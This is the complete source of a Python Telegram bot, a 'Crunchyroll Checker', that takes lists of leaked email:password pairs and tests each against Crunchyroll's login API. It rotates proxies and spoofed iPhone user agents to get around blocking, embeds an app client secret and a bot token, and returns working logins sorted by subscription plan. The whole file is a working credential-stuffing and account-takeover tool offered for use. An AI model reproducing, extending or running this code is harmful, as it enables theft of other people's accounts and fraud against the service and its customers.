#!/usr/bin/env python3
import requests
import uuid
import random
import re
import os
import time
import threading
from queue import Queue
from urllib.parse import urlparse, quote

from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from colorama import init, Fore, Style

init(autoreset=True)

ORANGE = '\033[38;5;208m'
RESET = Style.RESET_ALL
DEBUG_MODE = False

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8568495022:AAFPzrEOkCqXFGdlRV5O22xepyPXPwOX4tM")

AUTHORIZED_USERS = []

check_queue = Queue()
results = {}
current_status = {}

IPHONE_USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1",
]


def get_random_user_agent():
    return random.choice(IPHONE_USER_AGENTS)


def generate_guid():
    return str(uuid.uuid4())


def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    proxy_types = ['socks5', 'socks4', 'https', 'http']
    proxy_type = 'http'

    has_scheme = any(proxy_str.lower().startswith(f'{pt}://') for pt in proxy_types)

    if has_scheme:
        for pt in proxy_types:
            if proxy_str.lower().startswith(f'{pt}://'):
                proxy_type = pt
                break
        try:
            parsed = urlparse(proxy_str)
            host = parsed.hostname
            port = parsed.port
            username = parsed.username
            password = parsed.password

            if not host or not port:
                return None

            if username and password:
                proxy_url = f"{proxy_type}://{quote(username, safe='')}:{quote(password, safe='')}@{host}:{port}"
            elif username:
                proxy_url = f"{proxy_type}://{quote(username, safe='')}@{host}:{port}"
            else:
                proxy_url = f"{proxy_type}://{host}:{port}"

            return {'http': proxy_url, 'https': proxy_url}
        except Exception:
            return None

    auth = None
    host_port = proxy_str

    if '@' in proxy_str:
        auth_part, host_port = proxy_str.rsplit('@', 1)
        auth = auth_part

    parts = host_port.split(':')

    if len(parts) == 4:
        host = parts[0]
        port = parts[1]
        auth = f"{parts[2]}:{parts[3]}"
    elif len(parts) == 2:
        host = parts[0]
        port = parts[1]
    else:
        return None

    try:
        int(port)
    except ValueError:
        return None

    if auth:
        if ':' in auth:
            user, passwd = auth.split(':', 1)
            proxy_url = f"{proxy_type}://{quote(user, safe='')}:{quote(passwd, safe='')}@{host}:{port}"
        else:
            proxy_url = f"{proxy_type}://{quote(auth, safe='')}@{host}:{port}"
    else:
        proxy_url = f"{proxy_type}://{host}:{port}"

    return {'http': proxy_url, 'https': proxy_url}


def check_account(email, password, proxy=None):
    user_agent = get_random_user_agent()
    guid = generate_guid()

    headers_token = {
        "Host": "beta-api.crunchyroll.com",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=1.0",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Etp-Anonymous-Id": guid,
        "User-Agent": user_agent
    }

    data_token = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "offline_access",
        "client_id": "ajcylfwdtjjtq7qpgks3",
        "client_secret": "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_",
        "device_id": guid,
        "device_name": "IPhone",
        "device_type": "IPhone"
    }

    try:
        response = requests.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            headers=headers_token,
            data=data_token,
            proxies=proxy,
            timeout=30
        )

        if "invalid_credentials" in response.text or "force_password_reset" in response.text:
            return ("FAIL", None)

        if "Request blocked" in response.text:
            return ("RETRY", None)

        if "access_token" not in response.text:
            return ("FAIL", None)

        json_resp = response.json()
        access_token = json_resp.get("access_token", "")

    except Exception:
        return ("RETRY", None)

    headers_account = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.8",
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "User-Agent": user_agent
    }

    try:
        response = requests.get(
            "https://beta-api.crunchyroll.com/accounts/v1/me",
            headers=headers_account,
            proxies=proxy,
            timeout=30
        )

        json_resp = response.json()
        external_id = json_resp.get("external_id", "")

        if not external_id:
            return ("FAIL", None)

    except Exception:
        return ("RETRY", None)

    subs_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"

    try:
        response = requests.get(
            subs_url,
            headers=headers_account,
            proxies=proxy,
            timeout=30
        )

        resp_text = response.text

        if ("subscription.not_found" in resp_text or
                "Subscription Not Found" in resp_text or
                '"items":[]' in resp_text):
            custom_line = f"{email}:{password}"
            return ("CUSTOM", custom_line)

        plan = ""
        duration = ""

        try:
            subs_json = response.json()
            items = subs_json.get("items", [])
            if items:
                first_item = items[0]
                product = first_item.get("product", {})

                plan = product.get("name", "")
                duration = product.get("cycle_duration", "")

                if not plan:
                    plan = product.get("sku", "") or first_item.get("sku", "")
                if not duration:
                    duration = first_item.get("cycle_duration", "") or first_item.get("duration", "")
        except Exception:
            pass

        if not plan:
            name_match = re.search(r'"items"\s*:\s*\[.*?"name"\s*:\s*"([^"]+)"', resp_text, re.DOTALL)
            if name_match:
                plan = name_match.group(1)
            else:
                name_match = re.search(r'"name"\s*:\s*"([^"]+)"', resp_text)
                if name_match:
                    plan = name_match.group(1)

        if not duration:
            duration_match = re.search(r'"cycle_duration"\s*:\s*"([^"]+)"', resp_text)
            if duration_match:
                duration = duration_match.group(1)

        if not plan:
            plan = "Premium"
        if not duration:
            duration = "Active"

        plan_names = {
            "cr_fan": "Fan",
            "cr_fanpack": "Fan Pack",
            "cr_mega_fan": "Mega Fan",
            "cr_megafan": "Mega Fan",
            "cr_megafanpack": "Mega Fan Pack",
            "cr_ultimate_fan": "Ultimate Fan",
            "cr_ultimatefan": "Ultimate Fan",
            "cr_ultimatefanpack": "Ultimate Fan Pack",
            "fan": "Fan",
            "fanpack": "Fan Pack",
            "mega_fan": "Mega Fan",
            "megafan": "Mega Fan",
            "mega fan": "Mega Fan",
            "megafanpack": "Mega Fan Pack",
            "ultimate_fan": "Ultimate Fan",
            "ultimatefan": "Ultimate Fan",
            "ultimate fan": "Ultimate Fan",
            "ultimatefanpack": "Ultimate Fan Pack"
        }
        plan_lower = plan.lower().strip()
        plan_display = plan_names.get(plan_lower, plan.replace("_", " ").title())

        duration_map = {
            "P1M": "1 Month",
            "P3M": "3 Months",
            "P6M": "6 Months",
            "P1Y": "1 Year",
            "P2Y": "2 Years"
        }
        duration_display = duration_map.get(duration.upper(), duration)

        hit_line = f"{email}:{password} | {plan_display} | {duration_display}"

        return ("SUCCESS", hit_line)

    except Exception:
        return ("RETRY", None)


def worker():
    while True:
        try:
            item = check_queue.get(timeout=1)
        except Exception:
            continue

        user_id = item['user_id']
        email = item['email']
        password = item['password']
        proxy = item.get('proxy')

        result, data = check_account(email, password, proxy)

        if user_id not in results:
            results[user_id] = {
                "SUCCESS": 0, "CUSTOM": 0, "FAIL": 0, "RETRY": 0,
                "total": 0, "hits": [], "customs": []
            }

        results[user_id][result] += 1
        results[user_id]["total"] += 1

        if result == "SUCCESS" and data:
            results[user_id]["hits"].append(data)

        if result == "CUSTOM" and data:
            results[user_id]["customs"].append(data)

        current_status[user_id] = results[user_id]
        check_queue.task_done()


# ── Telegram Bot Commands ──────────────────────────────────────────────

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ You are not authorized to use this bot.")
        return

    welcome_msg = (
        "🎬 *Crunchyroll Checker Bot* 🎬\n\n"
        "Welcome! I can help you check Crunchyroll accounts.\n\n"
        "*Commands:*\n"
        "/start - Start the bot\n"
        "/help - Help and command list\n"
        "/check - Start checking accounts\n"
        "/status - View current check status\n"
        "/results - View results so far\n"
        "/clear - Clear your results\n"
        "/stats - Bot statistics\n\n"
        "*How to use:*\n"
        "1. Send /check command\n"
        "2. Send your combo file (email:pass format)\n"
        "3. Checking will begin automatically"
    )
    update.message.reply_text(welcome_msg, parse_mode=ParseMode.MARKDOWN)


def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ Unauthorized access.")
        return

    help_text = (
        "📚 *Commands Detail:*\n\n"
        "/start - Initialize the bot\n"
        "/help - This help message\n"
        "/check - Start a new check\n"
        "/status - View current progress\n"
        "/results - List of hits and customs\n"
        "/clear - Clear your results\n"
        "/stats - Bot usage statistics\n\n"
        "*File Format:*\n"
        "Combo file must be in email:password format\n"
        "Example: `email@example.com:password123`\n\n"
        "*Results:*\n"
        "✅ SUCCESS - Premium accounts with subscription\n"
        "💙 CUSTOM - Valid accounts without subscription\n"
        "❌ FAIL - Invalid credentials\n"
        "🔄 RETRY - Blocked/Error (try again)"
    )
    update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)


def check_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ Unauthorized access.")
        return

    if user_id not in results:
        results[user_id] = {
            "SUCCESS": 0, "CUSTOM": 0, "FAIL": 0, "RETRY": 0,
            "total": 0, "hits": [], "customs": []
        }

    update.message.reply_text(
        "📁 *Send Your Combo File*\n\n"
        "Send a file with email:password format, one combo per line.\n\n"
        "Example:\n"
        "`email1@gmail.com:pass123`\n"
        "`email2@yahoo.com:pass456`\n\n"
        "Want to use proxies? /noproxy or /withproxy",
        parse_mode=ParseMode.MARKDOWN
    )

    context.user_data['waiting_for_combo'] = True
    context.user_data['use_proxy'] = False


def noproxy(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ Unauthorized access.")
        return

    context.user_data['use_proxy'] = False
    context.user_data['waiting_for_combo'] = True
    update.message.reply_text(
        "✅ *Checking without proxies.*\n\nNow send your combo file:",
        parse_mode=ParseMode.MARKDOWN
    )


def withproxy(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ Unauthorized access.")
        return

    context.user_data['use_proxy'] = True
    context.user_data['waiting_for_proxy'] = True
    update.message.reply_text(
        "🔌 *Send Proxy File*\n\n"
        "Proxy file format (one proxy per line):\n"
        "`ip:port` or `protocol://user:pass@ip:port`\n\n"
        "Send the proxy file first, then the combo file.",
        parse_mode=ParseMode.MARKDOWN
    )


def handle_document(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ Unauthorized access.")
        return

    if not context.user_data.get('waiting_for_combo') and not context.user_data.get('waiting_for_proxy'):
        update.message.reply_text("❌ Please use /check command first.")
        return

    file = update.message.document
    file_id = file.file_id

    new_file = context.bot.get_file(file_id)

    if context.user_data.get('waiting_for_proxy', False):
        proxy_path = f"/tmp/proxy_{user_id}.txt"
        new_file.download(proxy_path)

        proxies = []
        try:
            with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        parsed = parse_proxy(line)
                        if parsed:
                            proxies.append(parsed)
        finally:
            try:
                os.remove(proxy_path)
            except OSError:
                pass

        if proxies:
            context.user_data['proxies'] = proxies
            context.user_data['proxy_index'] = 0
            update.message.reply_text(f"✅ {len(proxies)} proxies loaded!\n\nNow send your combo file:")
            context.user_data['waiting_for_proxy'] = False
            context.user_data['waiting_for_combo'] = True
        else:
            update.message.reply_text("❌ No valid proxies found in the file. Try again with /withproxy")
            context.user_data['waiting_for_proxy'] = False

    elif context.user_data.get('waiting_for_combo', False):
        combo_path = f"/tmp/combo_{user_id}.txt"
        new_file.download(combo_path)

        combos = []
        try:
            with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            email, password = parts
                            combos.append((email.strip(), password.strip()))
        finally:
            try:
                os.remove(combo_path)
            except OSError:
                pass

        if combos:
            update.message.reply_text(
                f"📊 *{len(combos)} combos loaded!*\n\nStarting check...",
                parse_mode=ParseMode.MARKDOWN
            )

            proxies = context.user_data.get('proxies', [])
            proxy_index = 0

            for email, password in combos:
                proxy = None
                if proxies and context.user_data.get('use_proxy', False):
                    proxy = proxies[proxy_index % len(proxies)]
                    proxy_index += 1

                check_queue.put({
                    'user_id': user_id,
                    'email': email,
                    'password': password,
                    'proxy': proxy
                })

            update.message.reply_text(
                f"✅ Checking started! {len(combos)} accounts queued.\n"
                "Use /status to check progress."
            )
        else:
            update.message.reply_text("❌ No valid combos found in the file. Check email:password format.")

        context.user_data['waiting_for_combo'] = False
        context.user_data.pop('proxies', None)


def handle_text_combo(update: Update, context: CallbackContext):
    """Handle combos sent as plain text messages instead of files."""
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        return

    if not context.user_data.get('waiting_for_combo'):
        return

    text = update.message.text.strip()
    combos = []
    for line in text.split('\n'):
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                email, password = parts
                combos.append((email.strip(), password.strip()))

    if not combos:
        return

    if user_id not in results:
        results[user_id] = {
            "SUCCESS": 0, "CUSTOM": 0, "FAIL": 0, "RETRY": 0,
            "total": 0, "hits": [], "customs": []
        }

    proxies = context.user_data.get('proxies', [])
    proxy_index = 0

    for email, password in combos:
        proxy = None
        if proxies and context.user_data.get('use_proxy', False):
            proxy = proxies[proxy_index % len(proxies)]
            proxy_index += 1

        check_queue.put({
            'user_id': user_id,
            'email': email,
            'password': password,
            'proxy': proxy
        })

    update.message.reply_text(
        f"✅ {len(combos)} combos queued for checking.\nUse /status to check progress."
    )
    context.user_data['waiting_for_combo'] = False
    context.user_data.pop('proxies', None)


def status_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ Unauthorized access.")
        return

    if user_id in results:
        r = results[user_id]
        total = r.get('total', 0)
        status_msg = (
            f"📊 *Current Status*\n\n"
            f"Total Checked: {total}\n"
            f"✅ Success (Premium): {r['SUCCESS']}\n"
            f"💙 Custom (Valid): {r['CUSTOM']}\n"
            f"❌ Fail: {r['FAIL']}\n"
            f"🔄 Retry: {r['RETRY']}\n\n"
            f"Queue size: {check_queue.qsize()}"
        )
    else:
        status_msg = "❌ No checks have been performed yet."

    update.message.reply_text(status_msg, parse_mode=ParseMode.MARKDOWN)


def results_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ Unauthorized access.")
        return

    if user_id not in results or (not results[user_id]['hits'] and not results[user_id]['customs']):
        update.message.reply_text("❌ No results found yet.")
        return

    r = results[user_id]

    if r['hits']:
        hits_text = "*✅ Premium Hits:*\n" + "\n".join(r['hits'][:10])
        if len(r['hits']) > 10:
            hits_text += f"\n...and {len(r['hits']) - 10} more hits"
        update.message.reply_text(hits_text, parse_mode=ParseMode.MARKDOWN)

    if r['customs']:
        customs_text = "*💙 Custom Accounts:*\n" + "\n".join(r['customs'][:10])
        if len(r['customs']) > 10:
            customs_text += f"\n...and {len(r['customs']) - 10} more customs"
        update.message.reply_text(customs_text, parse_mode=ParseMode.MARKDOWN)

    if r['hits']:
        hits_path = f"/tmp/hits_{user_id}.txt"
        try:
            with open(hits_path, "w") as f:
                for hit in r['hits']:
                    f.write(hit + "\n")
            with open(hits_path, "rb") as f:
                update.message.reply_document(f, filename="hits.txt")
        finally:
            try:
                os.remove(hits_path)
            except OSError:
                pass

    if r['customs']:
        customs_path = f"/tmp/customs_{user_id}.txt"
        try:
            with open(customs_path, "w") as f:
                for custom in r['customs']:
                    f.write(custom + "\n")
            with open(customs_path, "rb") as f:
                update.message.reply_document(f, filename="customs.txt")
        finally:
            try:
                os.remove(customs_path)
            except OSError:
                pass


def clear_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ Unauthorized access.")
        return

    if user_id in results:
        del results[user_id]
    if user_id in current_status:
        del current_status[user_id]

    update.message.reply_text("🗑 Your results have been cleared.")


def stats_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ Unauthorized access.")
        return

    total_users = len(results)
    total_checked = sum(r.get('total', 0) for r in results.values())
    total_hits = sum(len(r.get('hits', [])) for r in results.values())
    total_customs = sum(len(r.get('customs', [])) for r in results.values())
    queue_size = check_queue.qsize()

    stats_msg = (
        "📈 *Bot Statistics*\n\n"
        f"Active Users: {total_users}\n"
        f"Total Checked: {total_checked}\n"
        f"Total Hits: {total_hits}\n"
        f"Total Customs: {total_customs}\n"
        f"Queue Size: {queue_size}\n"
        f"Worker Threads: {WORKER_THREADS}"
    )
    update.message.reply_text(stats_msg, parse_mode=ParseMode.MARKDOWN)


WORKER_THREADS = 3


def main():
    print(f"{Fore.GREEN}[+] Starting Crunchyroll Checker Bot...{RESET}")

    for i in range(WORKER_THREADS):
        t = threading.Thread(target=worker, daemon=True, name=f"Worker-{i+1}")
        t.start()
        print(f"{Fore.CYAN}[*] Worker thread {i+1} started{RESET}")

    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("check", check_command))
    dp.add_handler(CommandHandler("noproxy", noproxy))
    dp.add_handler(CommandHandler("withproxy", withproxy))
    dp.add_handler(CommandHandler("status", status_command))
    dp.add_handler(CommandHandler("results", results_command))
    dp.add_handler(CommandHandler("clear", clear_command))
    dp.add_handler(CommandHandler("stats", stats_command))
    dp.add_handler(MessageHandler(Filters.document, handle_document))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text_combo))

    print(f"{Fore.GREEN}[+] Bot is running! Press Ctrl+C to stop.{RESET}")
    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    main()
